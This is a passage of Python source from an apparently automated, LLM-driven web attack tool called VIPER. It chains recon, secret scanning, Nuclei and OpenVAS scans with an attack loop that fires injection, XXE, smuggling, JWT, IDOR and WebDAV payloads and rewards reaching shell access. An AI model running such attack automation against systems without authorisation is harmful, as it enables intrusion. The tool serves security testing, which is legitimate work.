                            port_scan=True,
                            tech_fingerprint=True,
                            dns_enum=True
                        ),
                        timeout=recon_budget * 60
                    )
                    target.subdomains = recon_result.subdomains
                    target.open_ports = recon_result.open_ports
                    target.technologies.update(
                        tech for url_tech in recon_result.technologies.values()
                        for tech in url_tech.get('technologies', [])
                    )
                    results["phases"]["recon"] = recon_result.to_dict()
                    # VIPER 4.0: Wappalyzer additional tech detection on recon data
                    if hasattr(self, 'wappalyzer') and self.wappalyzer:
                        try:
                            for url_key, tech_data in recon_result.technologies.items():
                                body_content = tech_data.get('body', '')
                                hdrs = tech_data.get('headers', {})
                                if body_content or hdrs:
                                    wap_techs = self.wappalyzer.analyze(body_content, hdrs)
                                    if wap_techs:
                                        target.technologies.update(wap_techs)
                                        self.log(f"  [Wappalyzer] Detected on {url_key}: {wap_techs}")
                        except Exception:
                            pass
                    # VIPER 4.0: Populate graph from recon
                    if self.graph_engine and recon_result:
                        try:
                            self.graph_engine.populate_from_recon(domain, recon_result)
                        except Exception as e:
                            self.log(f"[GraphEngine] Recon population failed: {e}", "WARN")
                except asyncio.TimeoutError:
                    self.log(f"Recon timed out after {recon_budget:.1f} min", "WARN")
                except Exception as e:
                    self.log(f"Recon error: {e}", "ERROR")
            
            # Phase 2.5: Secret Scanning (GitHub leaked credentials)
            if self.secret_scanner and datetime.now() < end_time:
                self.log("\n=== Phase 2.5: Secret Scanning ===")
                try:
                    domain = self._extract_domain(target_url)
                    secret_findings = await asyncio.wait_for(
                        self.secret_scanner.scan_target(domain, session=self.session),
                        timeout=120  # 2 min max for secret scanning
                    )
                    for sf in secret_findings:
                        results["findings"].append(sf.to_dict())
                    results["phases"]["secrets"] = {
                        "findings_count": len(secret_findings),
                        "summary": self.secret_scanner.summary(),
                    }
                except asyncio.TimeoutError:
                    self.log("Secret scanning timed out", "WARN")
                except Exception as e:
                    self.log(f"Secret scanning error: {e}", "ERROR")

            # Phase 3: Surface Mapping (with timeout)
            if self.surface_mapper and datetime.now() < end_time:
                self.log("\n=== Phase 3: Surface Mapping ===")
                try:
                    surface_result = await asyncio.wait_for(
                        self.surface_mapper.map_surface(
                            target_url,
                            crawl_depth=2,
                            max_pages=30
                        ),
                        timeout=surface_budget * 60
                    )
                    target.parameters.update(
                        p for params in surface_result.url_parameters.values()
                        for p in params
                    )
                    target.js_endpoints = surface_result.js_endpoints
                    target.api_endpoints = surface_result.api_endpoints
                    target.endpoints.update(surface_result.api_endpoints)
                    results["phases"]["surface"] = surface_result.to_dict()
                    
                    # Add JS secrets as findings
                    for secret in surface_result.js_secrets:
                        results["findings"].append({
                            "type": "js_secret",
                            "severity": "high",
                            "details": secret
                        })
                except asyncio.TimeoutError:
                    self.log(f"Surface mapping timed out after {surface_budget:.1f} min", "WARN")
                except Exception as e:
                    self.log(f"Surface mapping error: {e}", "ERROR")

            # Phase 4: Nuclei Scanning (with timeout)
            if self.nuclei_scanner and self.nuclei_scanner.nuclei_path and datetime.now() < end_time:
                self.log("\n=== Phase 4: Nuclei Scanning ===")
                try:
                    nuclei_result = await asyncio.wait_for(
                        self.nuclei_scanner.quick_scan(target_url),
                        timeout=nuclei_budget * 60
                    )
                    target.nuclei_findings = [f.to_dict() for f in nuclei_result.findings]
                    results["nuclei_findings"] = target.nuclei_findings
                    results["phases"]["nuclei"] = nuclei_result.to_dict()
                    # Wire nuclei findings into main findings list
                    for nf in nuclei_result.findings:
                        vuln_type = self.nuclei_scanner._categorize_finding(nf)
                        nuclei_finding = {
                            "type": vuln_type,
                            "attack": vuln_type,
                            "vuln_type": vuln_type,
                            "severity": nf.severity.lower(),
                            "url": nf.matched_at,
                            "payload": nf.template_id,
                            "details": f"Nuclei: {nf.template_name} ({nf.template_id})",
                            "source": "nuclei",
                            "validated": True,  # Nuclei has its own validation
                            "confidence": 0.85,
                            "template_id": nf.template_id,
                        }
                        results["findings"].append(nuclei_finding)
                        target.vulns_found.append(nuclei_finding)
                        self.metrics["total_findings"] += 1
                        # Persist to DB
                        if self.db:
                            try:
                                domain = urllib.parse.urlparse(target_url).netloc
                                tid = self.db.add_target(target_url, domain)
                                self.db.add_finding(
                                    target_id=tid, vuln_type=vuln_type,
                                    severity=nf.severity.lower(),
                                    title=f"Nuclei: {nf.template_name}",
                                    url=nf.matched_at,
                                    payload=nf.template_id,
                                    evidence=nf.curl_command or "",
                                    confidence=0.85,
                                    validated=True,
                                )
                            except Exception:
                                pass
                    self.log(f"  Nuclei: {len(nuclei_result.findings)} findings wired to main list")
                    # VIPER 4.0: MITRE enrichment for nuclei findings
                    if self.mitre_enricher and nuclei_result.findings:
                        for finding in results["findings"]:
                            if finding.get("source") == "nuclei":
                                cves = finding.get("cves", [])
                                for cve_id in cves:
                                    enrichment = self.mitre_enricher.enrich_cve(cve_id)
                                    if enrichment and enrichment.get("cwes"):
                                        finding["mitre_enrichment"] = enrichment
                except asyncio.TimeoutError:
                    self.log(f"Nuclei timed out after {nuclei_budget:.1f} min", "WARN")
                except Exception as e:
                    self.log(f"Nuclei scan error: {e}", "ERROR")

            # Phase 4b: GVM/OpenVAS Network Scan (optional, non-blocking)
            if self.gvm_scanner and datetime.now() < end_time:
                self.log("\n=== Phase 4b: GVM/OpenVAS Network Scan ===")
                try:
                    domain = self._extract_domain(target_url)
                    if await self.gvm_scanner.is_available():
                        gvm_budget = min(30, max(5, (end_time - datetime.now()).total_seconds() / 60 * 0.3))
                        gvm_result = await asyncio.wait_for(
                            self.gvm_scanner.quick_network_scan(domain),
                            timeout=gvm_budget * 60,
                        )
                        results["phases"]["gvm"] = gvm_result.to_dict()
                        for gf in gvm_result.findings:
                            if gf.severity >= 4.0:  # medium+
                                vf = gf.to_viper_finding()
                                results["findings"].append(vf)
                                target.vulns_found.append(vf)
                                self.metrics["total_findings"] += 1
                                if self.db:
                                    try:
                                        tid = self.db.add_target(target_url, domain)
                                        self.db.add_finding(
                                            target_id=tid,
                                            vuln_type=vf["vuln_type"],
                                            severity=vf["severity"],
                                            title=f"OpenVAS: {gf.name}",
                                            url=f"{gf.host}:{gf.port}",
                                            payload=gf.oid,
                                            evidence=gf.description[:500],
                                            confidence=vf["confidence"],
                                            validated=True,
                                        )
                                    except Exception:
                                        pass
                        self.log(f"  GVM: {len(gvm_result.findings)} findings ({sum(1 for f in gvm_result.findings if f.severity >= 7.0)} high+)")
                    else:
                        self.log("  GVM not available — skipping network scan", "INFO")
                except asyncio.TimeoutError:
                    self.log("GVM scan timed out", "WARN")
                except Exception as e:
                    self.log(f"GVM scan error: {e}", "ERROR")

            # VIPER 4.0: Orchestrator strategic guidance before manual attacks
            if self.orchestrator:
                try:
                    tech_list = list(target.technologies) if target.technologies else []
                    objective = f"Security test {target_url} (tech: {', '.join(tech_list[:5])})"
                    guidance = await self.orchestrator.invoke(target_url, objective)
                    if guidance:
                        self.log(f"  [Orchestrator] Strategic guidance: {str(guidance)[:200]}")
                except Exception as e:
                    self.log(f"  [Orchestrator] Guidance failed: {e}")

            # Phase 5: Manual VIPER Attacks (guaranteed minimum time)
            remaining_seconds = (end_time - datetime.now()).total_seconds()
            manual_minutes = max(manual_min, remaining_seconds / 60.0)
            manual_minutes = max(3.0, manual_minutes)  # Always at least 3 min
            self.log(f"\n=== Phase 5: Manual Attacks ({manual_minutes:.1f} min) ===")
            manual_result = await self.hunt(target_url, max_minutes=int(manual_minutes))
            results["phases"]["manual"] = manual_result
            results["findings"].extend(manual_result.get("findings", []))
            target.access_level = manual_result.get("access_level", 0)

            # Include ReACT reasoning trace if available
            if self._react_engine and self._react_engine.traces:
                latest_trace = self._react_engine.traces[-1]
                results["react_trace"] = latest_trace.to_dict()
                self.log(f"  ReACT trace: {len(latest_trace.steps)} steps, "
                         f"LLM-guided={sum(1 for s in latest_trace.steps if s.llm_used)}")
            
            # Phase 6: LLM Analysis (direct API if available, else queue)
            if self.llm_analyzer and results["findings"]:
                self.log("\n=== Phase 6: LLM Analysis ===")
                try:
                    if self.llm_analyzer.has_direct_api:
                        self.log("  Using direct Claude API for analysis")
                        # Direct triage of critical findings
                        for finding in results["findings"][:5]:
                            if finding.get("severity") in ["critical", "high"]:
                                triage = await self.llm_analyzer.triage_finding_direct(finding)
                                if triage:
                                    finding["llm_triage"] = triage
                                    self.log(f"  LLM triage: {triage.get('reasoning', '')[:100]}")
                        # Get next attack recommendations
                        next_attacks = await self.llm_analyzer.decide_next_attack(
                            {"url": target_url, "technologies": list(target.technologies)},
                            list(target.attacks_tried.keys()),
                            results["findings"][:10],
                        )
                        if next_attacks:
                            results["llm_recommended_attacks"] = next_attacks
                            self.log(f"  LLM recommends: {next_attacks}")
                    else:
                        self.log("  No direct API — queuing for main agent")
                        for finding in results["findings"][:5]:
                            if finding.get("severity") in ["critical", "high"]:
                                await self.llm_analyzer.triage_finding(finding, target_url)
                        await self.llm_analyzer.get_next_vectors(
                            target_url, list(target.technologies),
                            results["findings"], list(target.attacks_tried.keys()),
                        )
                except Exception as e:
                    self.log(f"LLM analysis error: {e}", "ERROR")
        
        # Enrich findings with compliance data
        if COMPLIANCE_AVAILABLE:
            for finding in results["findings"]:
                _enrich_compliance(finding)

        # VIPER 4.0: Save findings to graph + persist
        if self.graph_engine:
            try:
                all_findings = results.get("findings", [])
                self.graph_engine.populate_from_findings(domain, all_findings)
                self.graph_engine.save()
            except Exception as e:
                self.log(f"[GraphEngine] Finding save failed: {e}", "WARN")

        # Generate report
        elapsed = (datetime.now() - start_time).total_seconds()
        results["elapsed_seconds"] = elapsed
        results["access_level"] = target.access_level
        
        report_file = self._generate_full_report(target, results, elapsed)
        results["report_file"] = str(report_file)

        # Generate HTML report
        if HTML_REPORTER_AVAILABLE:
            try:
                router = None
                try:
                    from ai.model_router import ModelRouter
                    router = ModelRouter()
                    if not router.is_available:
                        router = None
                except Exception:
                    pass
                html_content = await _generate_html_report(
                    findings=results.get("findings", []),
                    target=target_url,
                    metadata=results,
                    model_router=router,
                )
                domain = urllib.parse.urlparse(target_url).netloc.replace(":", "_")
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                html_file = _save_html_report(html_content, f"viper_full_{domain}_{ts}.html")
                results["html_report_file"] = str(html_file)
                self.log(f"HTML report: {html_file}")
            except Exception as e:
                self.log(f"HTML report generation failed: {e}", "WARN")

        # Close HackerHTTPClient
        if self.http_client:
            await self.http_client.close()

        self.log(f"\n=== Hunt Complete ===")
        self.log(f"Duration: {elapsed:.1f}s")
        self.log(f"Findings: {len(results['findings'])} ({self.metrics.get('validated_findings', 0)} validated)")
        self.log(f"False positives caught: {self.metrics.get('false_positives_caught', 0)}")
        self.log(f"Nuclei: {len(results['nuclei_findings'])}")
        if "gvm" in results.get("phases", {}):
            gvm_phase = results["phases"]["gvm"]
            self.log(f"GVM/OpenVAS: {gvm_phase.get('total_findings', 0)} findings")
        if self.stealth:
            stats = self.stealth.get_stats()
            if stats["level_value"] > 0:
                self.log(f"Stealth: {stats['level']} | WAFs: {stats['detected_wafs']} | Blocked: {stats['blocked_domains']}")
        self.log(f"Report: {report_file}")

        if self.db:
            self.log(f"DB stats: {self.db.stats()}")

        self.save_state()

        return results
    
    def _extract_domain(self, url: str) -> str:
        """Extract domain from URL"""
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc.split(':')[0]
    
    # =====================
    # ORIGINAL HUNT METHOD
    # =====================
    
    def _check_markers(self, markers: list, body: str, headers: dict) -> tuple:
        """Smart marker detection using regex with context awareness.

        Returns (matched_marker, confidence) or None if no match.
        Checks markers against body using regex, ignores matches inside
        HTML comments, script blocks, and common framework error pages.
        """
        if not body:
            return None

        body_lower = body.lower()

        # Strip regions that commonly cause false positives
        stripped = re.sub(r"<!--[\s\S]*?-->", "", body, flags=re.DOTALL)
        stripped_no_script = re.sub(
            r"<script[^>]*>[\s\S]*?</script>", "", stripped,
            flags=re.DOTALL | re.IGNORECASE,
        )

        # Common framework error page signatures that produce FP markers
        fp_signatures = [
            "laravel", "symfony", "django debug", "werkzeug debugger",
            "whitelabel error page", "application error", "stack trace",
        ]
        is_error_page = any(sig in body_lower for sig in fp_signatures)

        headers_str = " ".join(f"{k}: {v}" for k, v in (headers or {}).items()).lower()

        for marker in markers:
            confidence = 0.0

            # Try regex first, fall back to literal substring
            try:
                m_body = re.search(marker, stripped_no_script, re.IGNORECASE)
                m_body_raw = re.search(marker, body, re.IGNORECASE)
            except re.error:
                # Not a valid regex — treat as literal
                if marker.lower() not in stripped_no_script.lower() and marker.lower() not in body_lower:
                    continue
                confidence = 0.7 if marker.lower() in stripped_no_script.lower() else 0.3
                if is_error_page:
                    confidence *= 0.4
                return (marker, round(confidence, 2))

            if not m_body and not m_body_raw:
                continue

            # Matched in cleaned body (good signal)
            if m_body:
                confidence = 0.8
            elif m_body_raw:
                # Only matched inside comments/script — weak signal
                confidence = 0.3

            # Boost if also in headers
            try:
                if re.search(marker, headers_str, re.IGNORECASE):
                    confidence = min(confidence + 0.15, 1.0)
            except re.error:
                pass

            # Penalize if on a framework error/debug page
            if is_error_page:
                confidence *= 0.4

            if confidence >= 0.25:
                return (marker, round(confidence, 2))

        return None

    async def execute_attack(self, target: Target, attack_name: str) -> Tuple[bool, Dict]:
        """Execute an attack against target."""
        attack = self.knowledge.attacks.get(attack_name)
        if not attack:
            return False, {}
        
        base_url = target.url.rstrip('/')
        
        for payload in attack.payloads:
            test_url = base_url
            
            if attack.category == "recon":
                test_url = f"{base_url}{payload}"
                status, body, headers = await self.request(test_url)
            
            elif attack.category == "injection":
                if "graphql" in attack_name:
                    # GraphQL attacks are POST with JSON body
                    graphql_endpoints = [base_url, f"{base_url}/graphql", f"{base_url}/gql", f"{base_url}/api/graphql"]
                    status, body, headers = 0, "", {}
                    for gql_url in graphql_endpoints:
                        test_url = gql_url
                        status, body, headers = await self.request(
                            gql_url, method="POST",
                            data=payload,
                            headers={"Content-Type": "application/json"}
                        )
                        if status != 0 and status != 404:
                            break
                elif "xxe" in attack_name:
                    # XXE attacks are POST with XML body
                    status, body, headers = await self.request(
                        base_url, method="POST",
                        data=payload,
                        headers={"Content-Type": "application/xml"}
                    )
                elif "host_header" in attack_name:
                    # Host header injection
                    status, body, headers = await self.request(
                        base_url, headers={"Host": payload}
                    )
                elif "crlf" in attack_name:
                    # CRLF injection in URL parameters
                    if target.parameters:
                        param = list(target.parameters)[0]
                        parsed = urllib.parse.urlparse(base_url)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={payload}"
                    else:
                        test_url = f"{base_url}?redirect={payload}"
                    status, body, headers = await self.request(test_url)
                elif "cache_poisoning" in attack_name:
                    # Cache poisoning via injected headers
                    if ": " in payload:
                        hdr_name, hdr_val = payload.split(": ", 1)
                        status, body, headers = await self.request(
                            base_url, headers={hdr_name: hdr_val}
                        )
                    else:
                        status, body, headers = await self.request(base_url)
                elif "prototype_pollution" in attack_name:
                    # Prototype pollution via query params or JSON body
                    if payload.startswith("{"):
                        status, body, headers = await self.request(
                            base_url, method="POST", data=payload,
                            headers={"Content-Type": "application/json"}
                        )
                    else:
                        test_url = f"{base_url}?{payload}"
                        status, body, headers = await self.request(test_url)
                elif "request_smuggling" in attack_name:
                    # Request smuggling — send raw-ish payload
                    if ": " in payload:
                        hdr_name, hdr_val = payload.split(": ", 1)
                        status, body, headers = await self.request(
                            base_url, headers={hdr_name: hdr_val}
                        )
                    else:
                        status, body, headers = await self.request(base_url)
                elif "deserialization" in attack_name:
                    # Try as POST body with various content types
                    status, body, headers = await self.request(
                        base_url, method="POST", data=payload
                    )
                else:
                    if target.parameters:
                        param = list(target.parameters)[0]
                        parsed = urllib.parse.urlparse(base_url)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{base_url}?id={urllib.parse.quote(payload)}"
                    status, body, headers = await self.request(test_url)
            
            elif attack.category == "auth":
                if "jwt" in attack_name:
                    # Send JWT as Bearer token
                    hdrs = {"Authorization": f"Bearer {payload}"}
                    status, body, headers = await self.request(base_url, headers=hdrs)
                elif "idor" in attack_name:
                    # Try substituting IDs in URL parameters
                    if target.parameters:
                        param = list(target.parameters)[0]
                        parsed = urllib.parse.urlparse(base_url)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{base_url}?id={urllib.parse.quote(payload)}"
                    status, body, headers = await self.request(test_url)
                elif "verb" in attack_name:
                    # HTTP verb tampering — payload is the method
                    status, body, headers = await self.request(base_url, method=payload)
                elif "cookie" in attack_name:
                    parts = payload.split("=")
                    cookies = {parts[0]: parts[1]} if len(parts) == 2 else {}
                    status, body, headers = await self.request(base_url, cookies=cookies)
                elif "header" in attack_name:
                    parts = payload.split(": ")
                    hdrs = {parts[0]: parts[1]} if len(parts) == 2 else {}
                    status, body, headers = await self.request(base_url, headers=hdrs)
                else:
                    status, body, headers = await self.request(base_url)

            elif attack.category == "file":
                if "webdav" in attack_name:
                    parts = payload.split(" ")
                    if len(parts) == 2:
                        test_url = f"{base_url}{parts[1]}"
                        status, body, headers = await self.request(
                            test_url, method="PUT", data="viper_test"
                        )
                else:
                    status, body, headers = await self.request(base_url)
            
            elif attack.category == "misc":
                if "cors" in attack_name and ": " in payload:
                    hdr_name, hdr_val = payload.split(": ", 1)
                    status, body, headers = await self.request(
                        base_url, headers={hdr_name: hdr_val}
                    )
                else:
                    status, body, headers = await self.request(base_url)

            else:
                status, body, headers = await self.request(base_url)

            if status == 0:
                continue
            
            # Smart marker detection with regex and context awareness
            match_result = self._check_markers(attack.success_markers, body, headers)
            if match_result:
                marker, marker_confidence = match_result
                candidate = {
                    "attack": attack_name,
                    "payload": payload,
                    "marker": marker,
                    "marker_confidence": marker_confidence,
                    "url": test_url,
                    "severity": "high" if attack.category == "injection" else "medium",
                    "timestamp": datetime.now().isoformat()
                }

                # VIPER 2.0: Validate before declaring finding
                if self.validator:
                    try:
                        is_valid, confidence, reason = await self.validator.validate(
                            candidate, target.url
                        )
                        candidate["confidence"] = confidence
                        candidate["validation_reason"] = reason
                        if confidence < 0.4:
                            self.log(f"  [FP] {attack_name} rejected: confidence={confidence:.2f} — {reason}")
                            self.metrics["false_positives_caught"] = self.metrics.get("false_positives_caught", 0) + 1
                            continue
                        candidate["validation"] = reason
                        self.metrics["validated_findings"] = self.metrics.get("validated_findings", 0) + 1
                        # Telegram alert for validated findings
                        if self.notifier:
                            self.notifier.alert_finding(candidate)
                    except Exception as e:
                        candidate["confidence"] = 0.5
                        candidate["validation"] = f"Validation error: {e}"

                # VIPER 2.0: Check for duplicates
                if self.db:
                    try:
                        domain = urllib.parse.urlparse(test_url).netloc
                        tid = self.db.add_target(test_url, domain)
                        is_dup, dup_id = self.db.is_duplicate(tid, attack_name, test_url, payload)
                        if is_dup:
                            self.log(f"  [DUP] Skipping duplicate of finding #{dup_id}")
                            continue
                        self.db.add_finding(
                            target_id=tid, vuln_type=attack_name,
                            severity=candidate["severity"], title=f"{attack_name} at {test_url}",
                            url=test_url, payload=payload, evidence=marker,
                            confidence=candidate.get("confidence", 0.5),
                            validated=candidate.get("confidence", 0) > 0.4,
                        )
                        self.db.log_attack(tid, attack_name, payload, success=True,
                                           response_status=status, response_length=len(body))
                    except Exception:
                        pass

                # VIPER 2.0: Generate PoC for high+ findings
                if self.poc_gen and candidate.get("severity") in ("high", "critical"):
                    try:
                        poc_path = self.poc_gen.save_poc(candidate)
                        candidate["poc_path"] = str(poc_path)
                        self.log(f"  [POC] Saved: {poc_path.name}")
                    except Exception:
                        pass

                return True, candidate

            # Check failure markers (use regex-aware check)
            for fm in attack.failure_markers:
                try:
                    if re.search(fm, body, re.IGNORECASE):
                        break
                except re.error:
                    if fm.lower() in body.lower():
                        break
        
        return False, {}
    
    async def hunt(self, target_url: str, max_minutes: int = 5,
                  enable_bruteforce: bool = False,
                  enable_metasploit: bool = False,
                  enable_codefix: bool = False,
                  enable_post_exploit: bool = False,
                  enable_graph: bool = True) -> Dict:
        """Hunt a target with manual attacks."""
        target = Target(url=target_url)
        self.current_target = target
        start_time = datetime.now()
        end_time = start_time + timedelta(minutes=max_minutes)

        self.log(f"Manual hunt: {target_url} ({max_minutes} min)")

        # VIPER 3.0: Guardrails — validate target before proceeding
        if self.guardrail:
            try:
                is_valid, reason = self.guardrail.validate(target_url)
                if not is_valid:
                    self.log(f"[Guardrails] Target rejected: {reason}", "ERROR")
                    return {"success": False, "error": f"Guardrail rejected target: {reason}"}
                self.log(f"[Guardrails] Target validated: {reason}", "INFO")
            except Exception as e:
                self.log(f"[Guardrails] Validation error (proceeding): {e}", "WARN")

        # VIPER 3.0: Phase engine — set initial phase
        if self.phase_engine:
            try:
                self.phase_engine.transition(Phase.RECON if hasattr(Phase, 'RECON') else 'recon')
            except Exception:
                pass

        _emit("hunt_start", target=target_url, max_minutes=max_minutes, phase="recon")

        # Initial request
        status, body, headers = await self.request(target_url)
        if status == 0:
            return {"success": False, "error": "Connection failed"}

        target.technologies = self.knowledge.detect_technologies(body, headers)

        # VIPER 4.0: Wappalyzer tech fingerprinting
        if hasattr(self, 'wappalyzer') and self.wappalyzer:
            try:
                wap_techs = self.wappalyzer.analyze(body, headers)
                if wap_techs:
                    target.technologies.update(wap_techs)
                    self.log(f"  [Wappalyzer] Detected: {wap_techs}")
            except Exception:
                pass

        # VIPER 3.0: Build attack graph
        if enable_graph and self.attack_graph:
            try:
                domain = urllib.parse.urlparse(target_url).netloc
                self.attack_graph.add_target(domain)
                for tech in (target.technologies or []):
                    self.attack_graph.add_technology(domain, tech)
            except Exception as e:
                self.log(f"[AttackGraph] Error building initial graph: {e}", "WARN")

        # EvoGraph: start session
        if self.evograph:
            try:
                self._evograph_session_id = self.evograph.start_session(
                    target_url, list(target.technologies) if target.technologies else []
                )
                if self._react_engine:
                    self._react_engine._evograph_session_id = self._evograph_session_id
            except Exception as e:
                self.log(f"[EvoGraph] start_session failed: {e}", "WARN")
                self._evograph_session_id = None

        # Extract parameters
        parsed = urllib.parse.urlparse(target_url)
        if parsed.query:
            target.parameters = set(urllib.parse.parse_qs(parsed.query).keys())

        param_matches = re.findall(r'name=["\'](\w+)["\']', body)
        target.parameters.update(param_matches)

        # Add common parameter names for broader discovery
        COMMON_PARAMS = [
            "id", "user", "username", "email", "search", "q", "query",
            "page", "url", "file", "path", "redirect", "next", "callback",
            "cmd", "exec", "lang", "template", "debug", "action", "type",
            "cat", "dir", "name", "view", "content", "module", "token",
        ]
        # Probe common params: only add those that change the response
        base_url = target_url.split('?')[0]
        base_len = len(body)
        for cp in COMMON_PARAMS:
            if cp in target.parameters:
                continue
            try:
                probe_url = f"{base_url}?{cp}=test123"
                probe_status, probe_body, _ = await self.request(probe_url)
                # If response differs meaningfully, param is accepted
                if probe_status == 200 and abs(len(probe_body) - base_len) > 20:
                    target.parameters.add(cp)
            except Exception:
                pass
        
        findings = []
        attack_queue = []
        tried_attacks = set()

        # VIPER 4.0: Orchestrator strategic guidance before attack loop
        if self.orchestrator:
            try:
                tech_list = list(target.technologies) if target.technologies else []
                objective = f"Security test {target_url} (tech: {', '.join(tech_list[:5])})"
                guidance = await self.orchestrator.invoke(target_url, objective)
                if guidance:
                    self.log(f"  [Orchestrator] Strategic guidance: {str(guidance)[:200]}")
            except Exception as e:
                self.log(f"  [Orchestrator] Guidance failed: {e}")

        # ── ReACT-powered hunt (LLM reasons about each step) ──
        if self._react_engine:
            self.log("  [ReACT] Using LLM-powered reasoning loop")

            # Build context for ReACT
            react_context = {
                "technologies": list(target.technologies) if target.technologies else [],
                "has_input": bool(target.parameters),
                "has_login": any(k in body.lower() for k in ["login", "signin", "password", "auth"]),
                "has_php": any("php" in t.lower() for t in (target.technologies or [])),
                "parameters": list(target.parameters)[:10],
                "access_level": target.access_level,
                "vulns_found": [],
                "page_title": re.search(r"<title>(.*?)</title>", body, re.IGNORECASE).group(1)[:50] if re.search(r"<title>(.*?)</title>", body, re.IGNORECASE) else "",
                "status_code": status,
                "response_length": len(body),
                "headers": {k: v for k, v in list(headers.items())[:10]} if headers else {},
            }

            async def react_execute(url, action, ctx):
                """Bridge between ReACT engine and VIPER's attack execution."""
                nonlocal findings
                success, finding = await self.execute_attack(target, action)
                target.record_attack(action, success)
                self.knowledge.record_result(action, success, url)

                # Log to DB
                if self.db:
                    try:
                        domain = urllib.parse.urlparse(url).netloc
                        tid = self.db.add_target(url, domain)
                        self.db.log_attack(tid, action, success=success)
                    except Exception:
                        pass

                reward = 0.0
                if success:
                    self.log(f"  [!] FOUND: {action}", "VULN")

                    # VIPER 3.0: MITRE ATT&CK enrichment
                    if MITRE_AVAILABLE:
                        try:
                            finding = enrich_finding_mitre(finding)
                        except Exception:
                            pass

                    # VIPER 4.0: MITRE CWE/CAPEC enrichment
                    if hasattr(self, 'mitre_enricher') and self.mitre_enricher:
                        try:
                            finding = self.mitre_enricher.enrich(finding)
                        except Exception:
                            pass

                    findings.append(finding)
                    target.vulns_found.append(finding)
                    self.metrics["total_findings"] += 1
                    reward = 10.0

                    _emit("finding", vuln_type=action,
                          severity=finding.get("severity", "info"),
                          url=finding.get("url", target_url),
                          confidence=finding.get("confidence", 0))

                    # VIPER 3.0: Attack graph — record finding
                    if enable_graph and self.attack_graph:
                        try:
                            domain = urllib.parse.urlparse(target_url).netloc
                            self.attack_graph.add_finding(
                                domain, vuln_type=action, attack_type=action,
                                severity=finding.get("severity", "info"),
                                confidence=finding.get("confidence", 0),
                                url=finding.get("url", target_url),
                            )
                            self.attack_graph.add_attack(
                                domain, action, success=True,
                                url=finding.get("url", target_url),
                            )
                        except Exception:
                            pass

                    if any(x in action for x in ["rce", "cmdi", "shell"]):
                        target.access_level = 4
                        reward = 50.0
                    elif any(x in action for x in ["sqli", "lfi"]):
                        target.access_level = max(target.access_level, 2)
                        reward = 20.0
                else:
                    reward = -1.0
                    _emit("attack", action=action, success=False, target=url)

                    # VIPER 3.0: Attack graph — record failed attack
                    if enable_graph and self.attack_graph:
                        try:
                            domain = urllib.parse.urlparse(target_url).netloc
                            self.attack_graph.add_attack(
                                domain, action, success=False,
                                url=target_url,
                            )
                        except Exception:
                            pass

                # EvoGraph: record attack
                if self.evograph and self._evograph_session_id:
                    try:
                        self.evograph.record_attack(
                            self._evograph_session_id, action,
                            list(target.technologies) if target.technologies else [],
                            success, reward=reward,
                        )
                    except Exception:
                        pass

                # Update context for next step
                new_ctx = dict(ctx)
                new_ctx["access_level"] = target.access_level
                new_ctx["vulns_found"] = [f.get("attack", "") for f in findings]

                return reward, new_ctx, finding if success else None

            # Run ReACT loop
            try:
                trace = await self._react_engine.reason_and_act(
                    target=target_url,
                    context=react_context,
                    execute_fn=react_execute,
                )
                tried_attacks = set(s.action for s in trace.steps)
                self.log(f"  [ReACT] Completed: {len(trace.steps)} steps, "
                         f"reward={trace.total_reward:.1f}, findings={len(findings)}")
            except Exception as e:
                self.log(f"  [ReACT] Error: {e}, falling back to Q-learning", "WARN")
                # Fall through to standard loop below

        # ── Standard attack loop (Q-learning fallback or remaining time) ──
        if not self._react_engine or (datetime.now() < end_time and not findings):
            if self._react_engine:
                self.log("  [Fallback] Running standard attacks for remaining time")

            while datetime.now() < end_time:
                if not attack_queue:
                    relevant = self.knowledge.get_attacks_for_context(target)
                    attack_queue = [a for a in relevant if a not in tried_attacks]

                    if not attack_queue:
                        all_attacks = list(self.knowledge.attacks.keys())
                        untried = [a for a in all_attacks if a not in tried_attacks]
                        if untried:
                            attack_queue = random.sample(untried, min(3, len(untried)))
                        else:
                            break

                attack_name = attack_queue.pop(0)
                tried_attacks.add(attack_name)

                self.log(f"  Trying: {attack_name}")

                success, finding = await self.execute_attack(target, attack_name)
                target.record_attack(attack_name, success)
                self.knowledge.record_result(attack_name, success, target_url)
                _emit("attack", action=attack_name, success=success, target=target_url)

                if self.db:
                    try:
                        domain = urllib.parse.urlparse(target_url).netloc
                        tid = self.db.add_target(target_url, domain)
                        self.db.log_attack(tid, attack_name, success=success)
                    except Exception:
                        pass

                # EvoGraph: record attack in standard loop
                if self.evograph and self._evograph_session_id:
                    try:
                        reward = 10.0 if success else -1.0
                        self.evograph.record_attack(
                            self._evograph_session_id, attack_name,
                            list(target.technologies) if target.technologies else [],
                            success, reward=reward,
                        )
                    except Exception:
                        pass

                if success:
                    self.log(f"  [!] FOUND: {attack_name}", "VULN")
                    # VIPER 4.0: MITRE CWE/CAPEC enrichment
                    if hasattr(self, 'mitre_enricher') and self.mitre_enricher:
                        try:
                            finding = self.mitre_enricher.enrich(finding)
                        except Exception:
                            pass
                    findings.append(finding)
                    target.vulns_found.append(finding)
                    self.metrics["total_findings"] += 1

                    _emit("finding", vuln_type=attack_name,
                          severity=finding.get("severity", "info") if finding else "info",
                          url=finding.get("url", target_url) if finding else target_url,
                          confidence=finding.get("confidence", 0) if finding else 0)

                    followups = self.knowledge.get_followup_attacks(attack_name)
                    for f in followups:
                        if f not in tried_attacks and f not in attack_queue:
                            attack_queue.insert(0, f)

                    if any(x in attack_name for x in ["rce", "cmdi", "shell"]):
                        target.access_level = 4
                        break
                    elif any(x in attack_name for x in ["sqli", "lfi"]):
                        target.access_level = max(target.access_level, 2)

                await asyncio.sleep(0.1)

        # VIPER 2.0: Smart fuzzing phase on discovered parameters
        if UPGRADE_AVAILABLE and target.parameters and datetime.now() < end_time:
            self.log("  [FUZZ] Running smart fuzzer on parameters...")
            _emit("phase", phase="fuzz", target=target_url,
                  params=len(target.parameters))
            try:
                fuzzer = SmartFuzzer()
                for param in list(target.parameters)[:3]:
                    for vuln_type, grammar_attr in [("sqli", "SQL_GRAMMAR"), ("xss", "XSS_GRAMMAR")]:
                        grammar = getattr(GrammarFuzzer, grammar_attr, None)
